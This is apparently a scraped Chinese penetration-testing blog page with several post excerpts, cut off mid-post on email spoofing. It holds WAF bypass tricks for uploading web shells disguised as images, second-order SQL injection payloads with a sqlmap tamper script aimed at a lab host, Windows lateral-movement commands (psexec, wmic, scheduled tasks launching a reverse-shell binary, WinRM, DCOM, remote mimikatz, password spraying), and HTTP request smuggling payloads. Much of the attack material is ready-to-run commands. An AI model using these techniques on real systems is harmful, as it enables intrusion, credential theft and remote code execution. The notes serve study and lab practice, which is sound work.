Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;
Content-Type: image/gif在http头增加额外字符：
AAAAAAAA:filename=&quot;secquan.jpg&quot;;
Content-Disposition: form-data; name=&quot;file&quot;;  filename=&quot;shell.php&quot;
Content-Type: image/gifBaidu cloud ：
filename=&quot;xss.jpg .Php&quot;阿里云：
删掉Content-Type: image/jpeg即可绕过
云锁：正则的核心在匹配filename后面的值，思路是让它找不到匹配点。
原：
Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;
bypass：
Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=shell.php；对于换行等字符的其他应用：
对filename进行换行
filen
ame=&quot;shell.php&quot;对 = 换行
filename=
&quot;shell.php&quot;Tr3jer_CongRong大佬的总结：

filename在content-type下面
.asp{80-90}
NTFS ADS
.asp…
boundary不一致（boundary后添加空格）
iis6分号截断asp.asp;asp.jpg
apache解析漏洞php.php.ddd
boundary和content-disposition中间插入换行
hello.php:a.jpg然后hello.&lt;&lt;&lt;
filename=php.php
filename=”a.txt”;filename=”a.php”
name=\n”file”;filename=”a.php”
content-disposition:\n
.htaccess文件
a.jpg.\nphp
去掉content-disposition的form-data字段
php&lt;5.3 单双引号截断特性
删掉content-disposition: form-data;
content-disposition\00:
{char}+content-disposition
head头的content-type: tab
head头的content-type: multipart/form-DATA
filename后缀改为大写
head头的Content-Type: multipart/form-data;\n
.asp空格
.asp0x00.jpg截断
双boundary
file\nname=”php.php”
head头content-type空格:
form-data字段与name字段交换位置

链接：https://www.cnblogs.com/-qing-/p/10832850.html
https://xz.aliyun.com/t/2435
https://paper.seebug.org/219/


</section>
    <p class="sub">May 24, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/05/21/HSTS-bypassing/" class="title">HSTS bypassing</a>
    <section class="desc">
  HSTS：HTTP Strict Transport SecurityHSTS的作用是强制客户端（如浏览器）使用HTTPS与服务器创建连接。
firefox+burp绕过方法：
解决方法1：使用低版本firefox &lt; 3.6.25浏览器的旧版本无法与HSTS标头配合使用，因此会禁用HSTS强制实施
解决方法2：导入burpsuit证书 

解决方法3：忽略HSTS检查

命名：test.currentTimeOffsetSecondsvalue：11491200
清除history&amp;cache，然后重启浏览器



</section>
    <p class="sub">May 21, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/05/19/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/" class="title">二次注入详解</a>
    <section class="desc">
  0x01、二次注入原理：用户提交的值未被处理（转义或过滤）就存储在数据库中，而开发人员信任来自数据库的数据，未经处理直接在其他功能中调用
0x02、二次注入类型：
用户提交的值未被处理（转义或过滤）就存储在数据库中，未经处理直接在其他功能中调用。（对应案例1和3）
用户输入经过addslashes处理，但是数据库在存储过程吃掉 ‘&#39; ;再次调用时触发paylaod且绕过了addslashes等转义处理 。（对应案例2）

分析几个案例更容易理解；各个案例的源码我会在文末放出
0x03、案例1：直接以目标用户身份身份登录注册时没有经过任何任何处理，payload直接存入数据库；在登录时触发payload以目标（通常为管理员）身份登录
注册时构造payload：
用户名：admin&apos; -- -
密码：password登录处验证代码：
if($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;){
// Check if username is empty
if(empty(trim($_POST[&quot;username&quot;]))){
    $username_err = &apos;Please enter username.&apos;;
} else{
    $username = trim($_POST[&quot;username&quot;]);
}

// Check if password is empty
if(empty(trim($_POST[&apos;password&apos;]))){
    $password_err = &apos;Please enter your password.&apos;;
} else{
    $password = trim($_POST[&apos;password&apos;]);
}
####对用户输入没有进行特殊处理

if(empty(trim($_POST[&quot;username&quot;]))){
$username_err = &apos;Please enter username.&apos;;} else{
    $username = trim($_POST[&quot;username&quot;]);
  }

// Check if password is empty
if(empty(trim($_POST[&apos;password&apos;]))){
    $password_err = &apos;Please enter your password.&apos;;
} else{
    $password = trim($_POST[&apos;password&apos;]);
}

// Validate credentials
if(empty($username_err) &amp;&amp; empty($password_err)){
    // Prepare a select statement
    $sql = &quot;SELECT username, password FROM users WHERE username = ?&quot;;
####此时将用户名和密码从数据库中取出----&gt;触发构造的payload  
##SQL语句为：SELECT username, password FROM users WHERE username = &apos;admin&apos; -- - 
##也就是取出admin账户的账户密码来做验证；所以后边的代码可以不用看都没事   
    if($stmt = mysqli_prepare($link, $sql)){
        // Bind variables to the prepared statement as parameters
        mysqli_stmt_bind_param($stmt, &quot;s&quot;, $param_username);。
###在传递给mysqli_prepare()的SQL语句中为参数标记绑定变量为用户输入
        // Set parameters
        $param_username = $username;

        // Attempt to execute the prepared statement
        if(mysqli_stmt_execute($stmt)){
            // Store result
            mysqli_stmt_store_result($stmt);     
###获取$sql执行结果              
            // Check if username exists, if yes then verify password
            if(mysqli_stmt_num_rows($stmt) == 1){     ####结果集中行数等于1,即用户存在               
                // Bind result variables
                mysqli_stmt_bind_result($stmt, $username, $hashed_password); ###将结果集中的列绑定到变量。
                if(mysqli_stmt_fetch($stmt)){  ###从准备好的语句中获取结果到mysqli_stmt_bind_result()绑定的变量中 。
                    if(password_verify($password, $hashed_password)){
                        /* Password is correct, so start a new session and
                        save the username to the session */
                        session_start();
                        $_SESSION[&apos;username&apos;] = $username;      
                        header(&quot;location: home.php&quot;);
                    } else{
                        // Display an error message if password is not valid
                        $password_err = &apos;The password you entered was not valid.&apos;;
                    }
                }
            } else{
                // Display an error message if username doesn&apos;t exist
                $username_err = &apos;No account found with that username.&apos;;
            }
        } else{
            echo &quot;Oops! Something went wrong. Please try again later.&quot;;
        }
    }0x04、案例2：经典案例sqli-labs-24，更改管理账户密码在注册时构造payload
用户名： admin&apos; #
密码：password注册时对用户输入的注册用户名进行特殊字符转义
$username=  mysql_escape_string($_POST[&apos;username&apos;]) ;
$pass= mysql_escape_string($_POST[&apos;password&apos;]);
$re_pass= mysql_escape_string($_POST[&apos;re_password&apos;]);
....
###此时payload被转义为admin\&apos;\ #
...
$sql = &quot;insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)&quot;;
mysql_query($sql) or die(&apos;Error Creating your user account,  : &apos;.mysql_error());
...
##存入数据库后payload被还原为: admin&apos; #也就是转义会被数据库吃掉，在被引用时还原为我们的paylaod；原理如下图

登录时同样对用户输入进行特殊字符转义（没有进行特殊处理的话即会变成案例1）
function sqllogin(){
   $username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);
   $password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);
   $sql = &quot;SELECT * FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;
//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;
   $res = mysql_query($sql) or die(&apos;You tried to be real smart, Try harder!!!! :( &apos;);
   $row = mysql_fetch_row($res);
//print_r($row) ;
   if ($row[1]) {
return $row[1];
   } else {
  return 0;
   }
}简单验证一下注册和登录流程：

更改密码：
$sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;
####直接获取当前用户名进行密码更新
###此时SQL语句： UPDATE users SET PASSWORD=&apos;password&apos; where username=&apos;admin&apos;#&apos; and password=&apos;$curr_pass&apos;
$res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;);
........至此完成二次注入对目标用户密码的修改
0x05、案例3：二次注入中的数据查询（利用SQLMAP脚本进行二次注入） 以HTB的NightMare靶机为例：
注册帐户名 ： ’
登录进入发现SQL报错

初步验证注入点 ，在BurpSuit分别抓注册和登录包发送到Repeater；来回切换
&apos; -- -  仍然报错；寻找正确闭合方式
&quot; -- - 回显SQL报错信息
&apos;) -- -无SQL报错信息
1&apos;) or 1=1 #无SQL报错信息
&apos;) order by 1000#   回显SQL报错信息
&apos;) order by 1#  无SQL报错信息
.....
###最终验证出列值为 2 使用SQLMAP进行POST二次注入；编写对应tamper脚本简易思路：（难点是注册之后基于新cookie进行身份验证）我在这里找到了对应的技巧：将HTTP请求发送到主页并检索新的cookie值；将sqlmap生成HTTP请求替换Cookie值 
https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/
https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5
注册：register username位置填入 payload ;密码固定password=123456    
post_data = { ‘username’:payload, ‘password’:’tw123’,’register’:’Register’ }
然后是获取用户注册成功后返回的cookie并执行替换；使用–second-url  http://10.10.10.66/notes.php在index之后请求notes.php验证结果
response = s.post(“http://10.10.10.66/register.php&quot;, data=post_data)
php_cookie = re.search(‘PHPSESSID=(.*?);’, response.headers[‘Set-Cookie’]).group(1)
最终tamper：
#!/usr/bin/env python
import reimport requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
pass

def create_account(payload):
s = requests.Session()

post_data = { &apos;user&apos;:payload, &apos;pass&apos;:&apos;tw123&apos;, &apos;register&apos;:&apos;Register&apos; }
proxies = { &apos;http&apos;:&apos;http://127.0.0.1:8080&apos; }
response = s.post(&quot;http://10.10.10.66/register.php&quot;, data=post_data, proxies=proxies)
php_cookie = re.search(&apos;PHPSESSID=(.*?);&apos;, response.headers[&apos;Set-Cookie&apos;]).group(1)

return &quot;PHPSESSID={0}&quot;.format(php_cookie)

def tamper(payload, **kwargs):
headers = kwargs.get(&quot;headers&quot;, {})
headers[&quot;Cookie&quot;] = create_account(payload)
return payloadsqlmap语句：
sqlmap --technique=U -r login.req --dbms mysql --tamper second-order.py --second-url &apos;http://10.10.10.66/notes.php&apos; -p user --proxy http://127.0.0.1:8080

注意点：

post包中密码需要和tamper脚本中一致
去掉login.req中的cookie那一行
使用代理的话需要开启Burpsuit

这里就直接贴最终的paylaod吧：
sqlmap --technique=U -r login.req --dbms mysql --tamper second-order.py --second-url &apos;http://10.10.10.66/notes.php&apos; -p user --proxy http://127.0.0.1:8080 --dump -D sysadmin --no-cast####需要–no-cast 参数
0x06、总结：主要利用点还是网站对用户输入没有进行处理（这也是二次注入比较少的原因之一）；但是二次注入工具难以检测，所以危害还是很大的
参考链接：
http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/
http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html
https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5


</section>
    <p class="sub">May 19, 2020</p>
  </div>
</div>-->
<!---->
<!--
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">&lt;span class&#x3D;&quot;iconfont icon-arrow-right&quot;&gt;&lt;&#x2F;span&gt;</a>
  </nav>

-->

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.0.2/css/swiper.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.0.2/js/swiper.min.js"></script>
<div class="main-right flex1 flex flex-v">
    <div class="box-content flex1">
        <div class="swiper-container">
            <div class="swiper-wrapper">
                
                    <a title="Lateral Movementt" alt="Lateral Movementt" href="/2020/06/02/Lateral-Movementt/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="Lateral Movementt" alt="Lateral Movementt"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; Lateral Movementt &gt;</div>
                            <div class="content flex1">
                                
  PSEXEC优点：微软的东东
执行原理： 

通过ipc$连接，释放psexesvc.exe到目标机器

通过服务管理SCManager远程创建psexecsvc服务，并启动服务

客户端连接执行命令，服务端启动相应的程序并执行回显数据。

运行完后删除服务


使用方式：
1、先建立IPC通道连接，然后直接使用
net use \\192.168.0.116\ipc$ “password” /user:administrator
psexec.exe \\192.168.0.116 cmd                   进入半交互式cmdshell  ；    2、在psexec的参数中指定账户密码
psexec.exe \\192.168.0.116 –u administrator –p password  cmd -accepteula参数表示接受Sysinternals的最终用户许可协议，用于机器第一次使用psexec时不跳出提示框
-hashes可支持hash密码
使用psexec最低要求

远程机器的 139 或 445 端口需要开启状态，即 SMB；


明文密码或者 NTLM 哈希；


具备将文件写入共享文件夹的权限；


能够在远程机器上创建服务：SC_MANAGER_CREATE_SERVICE (访问掩码：0x0002)；


能够启动所创建的服务：SERVICE_QUERY_STATUS（访问掩码：0x0004）+ SERVICE_START（访问掩码：0x0010）

在启动psexec建立连接后，远程系统上会被安装一个服务:psexecsvc，安装服务会留下日志，而且psexec推出时有可能服务删除失败，所以不推荐使用psexec,而推荐WMIexec
WMI执行原理：
WMI（Windows Management Instrumentation,Windows 管理规范）是一项核心的 Windows 管理技术；通过使用端口135上的远程过程调用(RPC)进行通信以进行远程访问，用户可以使用 WMI 管理本地和远程计算机，整个运行过程都在计算机内存中发生，不会留下任何痕迹
利用条件：

WMI服务开启，端口135，默认开启。

防火墙允许135、445等端口通信。


wmic（03以上自带，缺点是无回显，可以将命令执行结果写入本地磁盘配合type命令远程读取）：
工作组横向：
wmic /node:192.168.0.116  /user:tw  /password:viq135311 process call create &quot;cmd.exe /c calc&quot;域内横向：
wmic /node:target.domain /user:domain\user /password:password process call create &quot;cmd.exe /c calc”wmiexec： 
获取半交互式shell：
cscript.exe //nologo wmiexec.vbs /shell 192.168.0.116 administrator password在远程系统上执行单条命令：
cscript.exe wmiexec.vbs /cmd 192.168.0.116 administrator password &quot;whoami&quot;在远程系统上执行bat脚本：
cscript.exe wmiexec.vbs /cmd 192.168.0.116 administrator password c:\programdata\test.bat使用hash的情况：wce注入hash再进行连接
wce –s 账号:主机名或域的名字:LM:NTLM

cscript //nologo wmiexec.vbs /shell 192.168.0.1注意：抓取的LM hash是AAD3开头的，或者是No Password之类的，计用32个0代替LM hash
Invoke-WMIMethod  （powershell自带,执行单条命令）
$User=&quot;administrator&quot; 
$Password= ConvertTo-SecureString -String &quot;password&quot; -AsPlainText -Force 
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password 
Invoke-WmiMethod -Class win32_process -Name create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;192.168.0.116&quot; -Credential $Cred其他的利用还有impacket套件、kali自带的pth-winexe、Invoke-TheHash.ps1(可批量)
scService Control；可通过smb创建任务，使用sc命令实现执行SYSTEM权限的命令,执行的文件必须为服务二进制文件
copy service.exe \\192.168.0.116\admin$\temp

sc \\192.168.0.116 create TestService binpath= &quot;C:\windows\temp\service.exe&quot;

sc \\192.168.0.116 start TestService

sc \\192.168.0.116 delete TestServicemsfvenom生成service exe：
-f exe-serviceCS生成service exe：
输出项选择windows service exe计划任务win xp/2003 为at命令
win7+ 为schtasks命令
利用条件：

目标管理员账户凭据

当前机器可正常net use到远程机器

目标机器的计划任务服务“Task scheduler”已正常启动


net use \\192.168.0.116\admin$  /user:administrator  password ###连接目标共享

net time \\192.168.0.116###查看目标主机当前时间

xcopy c:\rev.exe \\192.168.0.116\admin$\temp\###上传payload

chcp 437  ###如果目标为中文系统，需要先调整字符集

schtasks /create /s 192.168.0.116 /u administrator /p password /RL HIGHEST /F /tn &quot;WindowsUpdates&quot; /tr &quot;C:/Windows/temp/rev.exe&quot; /sc DAILY /mo 1 /ST 18:20###在远程目标机器上创建计划任务

schtasks /run /tn WindowsUpdates /s 192.168.0.116 /U administrator /P password   ###创建完成后手动执行

schtasks /query  /s 192.168.0.116 /U administrator /P password | findstr &quot;WindowsUpdates&quot;###检查运行状态

schtasks  /delete /F /tn WindowsUpdates  /U administrator /P password###反弹shell之后，删除计划任务参数讲解：
/TN：任务名称
/TR：任务执行的程序
/ST：任务执行的时间
winRMWindows Remote Management通过5985（HTTP）和5986（HTTPS）使用WMI的方式进行远程管理
利用条件：

在win 2012之后(包括win 2012)的版本是默认开启的，win 2012之前利用需要手动开启winRM。

防火墙对5986、5985端口开放。


powershell：
第一次执行winrm：当前主机的trustedhosts设置为*，表示信任任意主机，之后重启winRM。
Set-Item WSMan:localhost\client\trustedhosts -value *
Restart-Service WinRM常用命令：
Enable-PSRemoting -force   ###需要目标机器开启远程管理

Test-NetConnection 192.168.0.116 -CommonTCPPort WINRM   ###检查目标机器是否监听winrm端口

Get-Item WSMan:\localhost\Client\TrustedHosts   ###检查主机信任

Invoke-Command 192.168.0.116  -Credential $cred -ScriptBlock {Hostname}   ###远程执行命令

Enter-PSSession 192.168.0.116  -Credential  administrator   ###交互式用户凭证shell；会弹出一个输入密码的框用户凭证使用：
$User=&quot;administrator&quot; 
$Password= ConvertTo-SecureString -String &quot;password&quot; -AsPlainText -Force 
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password 
Invoke-Command  192.168.0.116  -Credential $cred -ScriptBlock {Hostname}直接使用mimikatz获取远程机器的账户密码：(在域中测试成功，工作组没能成功)
Import-Module ./Invoke-Mimikatz.ps1
Invoke-Mimikatz -ComputerName TARGETwinrs：
winrs -r:192.168.0.116  -u:administrator -p:password  &quot;ipconfig&quot;  ##执行命令
winrs -r:192.168.0.116  -u:administrator -p:password  &quot;cmd&quot;         ##shellevil-winrm 可通过用户凭证密码/hash直接获得交互shell
DCOMCOM：COM是Windows应用程序编程接口（API）的组件，该组件支持软件对象之间的交互。 通过COM，客户端对象可以调用服务器对象的方法，这些对象通常是动态链接库（DLL）或可执行文件（EXE）。
DCOM：Distributed COM；DCOM是COM的网络化版本，DCOM允许COM组件可以利用网络以二进制格式来传输数据
获取DCOM列表
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
或
Get-CimInstance Win32_DCOMApplication  #需win12以上存在某些具有命令执行功能的DCOM，可用于横向移动
MMC20.Application COM：（域中测试成功，工作组只能本地成功而不能远程）查看该DCOM信息：
Get-ChildItem &apos;registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}&apos;与目标建立连接：
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;192.168.0.116&quot;))
$com.Document.ActiveView | Get-Member通过ExecuteShellCommand执行程序：
$com.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c hostname &gt; c:\fromdcom.txt&quot;,&quot;7&quot;)Excel.Application
自动化脚本
## Password Spraying ##
Password Spraying实际上是域用户爆破
首次尝试使用一个用于多个用户名的通用密码登录。如果所有用户名的第一个密码都不正确，则攻击者将使用其他密码，在两次不同的密码猜测之间留出足够的时间；即采用大量用户名并使用单个密码将其循环的攻击方法，以免触发任何基于时间的帐户锁定阈值
自动从当前用户的域中生成用户列表，并尝试使用每个用户名和密码password进行身份验证
Import-Module .\DomainPasswordSpray.ps1 
Invoke-DomainPasswordSpray -Password password其他可选参数：
UserList-用于Spraying的用户列表。 如果未指定，将自动生成。
password-用于Spraying的单个密码。
PasswordList-用于Spraying的密码列表（不应该过多，导致账户锁定）
OutFile-输出结果到指定文件
domain-要对其进行Spraying的域。
Force-强制喷Spraying继续进行而不提示确认
RDPsharpRDP：SharpRDP.exe computername=dc01 command=calc username=offense\administrator password=123456
CS中实现：

基于tscon的RDP会话劫持https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/
https://pentestlab.blog/tag/rdp-session-hijacking/
https://ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement
PTH&amp;PTT&amp;OverPTH:没什么特别的，需要注意的是在win10中，默认启用LocalAccountTokenFilterPolicy，用于控制过滤本地管理员组中所有本地用户的远程连接UAC。
当LocalAccountTokenFilterPolicy设置为0(默认值)时，只能使用RID 500本地管理员远程连接，且不会已完全的管理员身份进行连接，无法不存在潜在的提权
需要设置为1，非内置的sid为500的用户才能进行远程连接
不会影响本地Administrators组中的域帐户，仅影响本地帐户
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /fhttps://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/
printers, open webroots, good old Tomcat还有就是关注内网打印机、web共享目录、旧版本tomcat等有利于横向的脆弱性设备/环境
链接：
https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f
https://lengjibo.github.io/LateralMovement/
https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/
https://ired.team/offensive-security/lateral-movement
https://rcoil.me/2019/08/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec/
https://my.oschina.net/u/4283892/blog/3307767



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Jun 2, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="CORS配置不当学习" alt="CORS配置不当学习" href="/2020/06/02/CORS%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AD%A6%E4%B9%A0/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="CORS配置不当学习" alt="CORS配置不当学习"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; CORS配置不当学习 &gt;</div>
                            <div class="content flex1">
                                
  CORS漏洞的成因很明显，就是服务端配置的规则不当所导致的。
SOP（Same-origin policy：##SOP同源策略,非同源的脚本不能访问或者操作其他域的页面对象
同源三要素：

同域名 
同协议 
同端口

CORS（Cross-origin Resourse SharingCORS跨域资源共享,使web应用程序能够无视同源策略，请求其他域的资源
CORS实现：（简单请求/非简单请求）
请求头：
1、origin,用于说明本次请求来自哪个源（域名+协议+端口）
2、Access-Control-Request-Method,用来列出浏览器的CORS请求会用到哪些HTTP方法
3、Access-Control-Request-Headers,指定浏览器CORS请求会额外发送的头信息字段响应头：
1、Access-Control-Allow-Origin(ACAO) 
用于指定允许访问资源的外域URI，对于携带身份凭证的请求不可使用通配符*
2、Access-Control-Allow-Credentials
表明是否允许浏览器读取response的内容，当用在preflight预检请求的响应中时，指定实际的请求是否可使用credentials漏洞挖掘：CORS的漏洞主要看当请求中带有Origin头部字段时，服务器的返回包是否带有CORS的相关字段（Access-Control-Allow*）并且允许Origin的域访问，因此origin字段的值需要多尝试不同的域或者为null。
使用burpsuit进行快速验证：

访问需要检测的网站，访问多个不同的页面，访问足够多后在BurpSuite的Proxy模块下的HTTP history来筛选带有CORS头部的值:

也可以测试下带有Access-Control-Allow-Origin: * 字段的网站是否有CORS漏洞，但是如果是如下组合，则没有漏洞，因为浏览器已经会阻止如下的配置。
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true绕过：
NULL源
使用目标域名作为子域名
…

CORS与JSONP的比较
CORS与JSONP的使用目的相同，但是比JSONP更强大。
JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。
更多学习链接：
CORS三种攻击场景： https://xz.aliyun.com/t/4663
CORS安全完全指南： https://xz.aliyun.com/t/2745



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Jun 2, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="HTTP Request Smuggling" alt="HTTP Request Smuggling" href="/2020/06/02/HTTP-Request-Smuggling/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="HTTP Request Smuggling" alt="HTTP Request Smuggling"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; HTTP Request Smuggling &gt;</div>
                            <div class="content flex1">
                                
  HTTP请求走私（HTTP Request Smuggling）
原理：HTTP规范提供了两种不同的方法来指定HTTP消息的长度，但是单个消息可能会同时使用这两种方法，从而使它们彼此冲突
HTTP规范中如果Content-Length和Transfer-Encoding标头同时存在，则Content-Length无效，在单个服务器时有效避免了冲突，但是当多个服务器时，由于服务器之间理解的不一致导致了HTTP Request Smuggling如果前端服务器和后端服务器相对于（可能是混淆的）Transfer-Encoding 标头而言行为不同，则它们可能在连续请求之间的边界上存在分歧，从而导致请求走私漏洞
这也意味着如果网站没有负载平衡，CDN和反向代理，则不会产生HTTP Request Smuggling。引入的代理层越多，越容易受到HTTP Request Smuggling攻击

Content-LengthContent-Length指的就是用 POST Method时带入的 data 的长度（此长度不包含\r\n）
POST /search HTTP/1.1
Host: xxxxxxxx
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
q=smugglingTransfer-EncodingPOST /search HTTP/1.1
Host: xxxxxxxx
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
b---&gt; data长度，十六进制
q=smuggling---&gt;data
0---&gt;结束符，后接\r\n\r\nKeep Alive##在HTTP1.1中默认使用keep alive，从而允许在单个连接上承载多个请求和响应所谓Keep-Alive，就是在HTTP请求中增加一个特殊的请求头Connection: Keep-Alive，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在HTTP1.1中是默认开启的。
相反，HTTP请求中带有Connection: close的话，通信完成之后，服务器会中断 TCP 连接
危害能够绕过安全机制，实施未授权访问，获取敏感信息并直接危害其他用户
漏洞类型
CL.TE：前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。
TE.CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。
TE.TE：前端服务器和后端服务器均支持Transfer-Encoding标头，但是可以通过某种方式混淆标头来诱导其中一台服务器不对其进行处理。   

Transfer-Encoding: xchunked


Transfer-Encoding : chunked


Transfer-Encoding: chunked

Transfer-Encoding: x



Transfer-Encoding:[tab]chunked



[space]Transfer-Encoding: chunked



X: X[\n]Transfer-Encoding: chunked



Transfer-Encoding

: chunked漏洞检测&amp;验证&amp;利用
需要关闭自动更新Content-Length功能：

漏洞检测：
POST / HTTP/1.1
Host: acbf1f1d1fb4d58580141b8b000300c1.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
Q上边构造的payload，Q并不在长度范围内，前端并不会处理到Q，而此时后端会等待下一个块大小超时；因此会有明显的时间延迟如果两个服务器都处于同步状态（TE.TE或CL.CL），则该请求将被前端拒绝，或者被两个系统无害处理。最后，如果以相反的方式发生同步（TE.CL），则由于无效的块大小’Q’，前端将拒绝该消息，而不会将其转发到后端。这样可以防止后端套接字中毒。
检测TE.CL
POST / HTTP/1.1
Host: acbf1f1d1fb4d58580141b8b000300c1.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G0终止符后，后端将超时，等待X到达
两种数据包比较：

漏洞验证

漏洞利用：(发包需要多试几次)
CL.TE:
POST / HTTP/1.1
Host: ac681fb21e744a6b8007290700200056.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

GTE.CL:
POST / HTTP/1.1
Host: ac681fb21e744a6b8007290700200056.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0终止符0后边接 \r\n\r\n
TE.TE：
POST / HTTP/1.1
Host: ac681fb21e744a6b8007290700200056.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-Encoding: xxx
5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0多种利用案例靶场：https://portswigger.net/web-security/request-smuggling/exploiting  
案例视频讲解： https://www.youtube.com/playlist?list=PL0W_QjMcqdSA64v56rOlTpGoIgc504Hb4&amp;pbjreload=10
https://xz.aliyun.com/t/6878 —&gt;内含很多利用案例
https://www.youtube.com/watch?v=kgkRih2MQtU
https://portswigger.net/web-security/request-smuggling
https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn 内含很多利用案例



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Jun 2, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="邮件伪造" alt="邮件伪造" href="/2020/05/30/%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="邮件伪造" alt="邮件伪造"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 邮件伪造 &gt;</div>
                            <div class="content flex1">
                                
  SPF：Sender Policy FrameworkSPF
原理：创建至少一个DNS TXT记录来启用SPF
SPF验证过程：

接收端获取发件端IP
